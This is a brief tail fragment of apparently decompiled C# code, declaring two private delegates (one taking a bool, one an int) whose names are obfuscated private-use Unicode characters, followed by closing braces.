    private delegate void \uF44A\uE487\uF52F\uEE05\uF8CB\uECF2\uEDD5\uEC3A\uF4A4\uEA56\uF418\uE3BA(
      bool _param1);

    private delegate void \uF44A\uE487\uF52F\uEE05\uF8CB\uECF2\uEDD5\uEC3A\uF4A4\uEA56\uF418\uE3BB(
      int _param1);
  }
}
